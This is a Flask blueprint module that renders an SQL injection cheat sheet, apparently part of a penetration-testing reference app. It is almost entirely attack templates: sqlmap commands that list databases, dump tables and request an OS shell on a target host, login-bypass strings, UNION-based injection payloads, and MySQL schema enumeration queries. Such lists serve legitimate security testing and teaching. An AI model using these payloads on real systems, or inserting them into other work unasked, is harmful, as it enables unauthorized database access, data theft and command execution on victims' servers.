from flask import Blueprint, render_template

bp = Blueprint("sqli", __name__)

CARDS = [
    {"title": "sqlmap", "hint": "Point at a parameter or a saved request.", "blocks": [
        {"tpl": 'sqlmap -u "http://$RHOST:$RPORT/page.php?id=1" --batch --dbs'},
        {"tpl": 'sqlmap -u "http://$RHOST:$RPORT/page.php?id=1" --batch -D <db> --tables'},
        {"tpl": 'sqlmap -u "http://$RHOST:$RPORT/page.php?id=1" --batch -D <db> -T <table> --dump'},
        {"tpl": 'sqlmap -r request.txt --batch --level 5 --risk 3'},
        {"tpl": 'sqlmap -u "http://$RHOST:$RPORT/page.php?id=1" --batch --os-shell'},
    ]},
    {"title": "Auth bypass", "hint": "Try in username and password fields.", "blocks": [
        {"tpl": "' OR '1'='1'-- -", "plain": True},
        {"tpl": '" OR "1"="1"-- -', "plain": True},
        {"tpl": "admin'-- -", "plain": True},
        {"tpl": "' OR 1=1#", "plain": True},
    ]},
    {"title": "Union-based", "hint": "Find column count, then place output.", "blocks": [
        {"tpl": "' ORDER BY 1-- -", "plain": True},
        {"tpl": "' UNION SELECT NULL-- -", "plain": True},
        {"tpl": "' UNION SELECT NULL,NULL,NULL-- -", "plain": True},
        {"tpl": "' UNION SELECT @@version,database(),user()-- -", "plain": True},
    ]},
    {"title": "Enumeration (MySQL)", "blocks": [
        {"tpl": "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -", "plain": True},
        {"tpl": "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- -", "plain": True},
    ]},
]


@bp.route("/sqli")
def index():
    return render_template("cheat.html", active="sqli",
                           title="SQL injection", tag="exploitation",
                           intro="Detection, auth bypass, union and enumeration.",
                           cards=CARDS)


MODULE = {"id": "sqli", "title": "SQLi", "category": "Exploitation",
          "order": 0, "blueprint": bp, "endpoint": "sqli.index"}
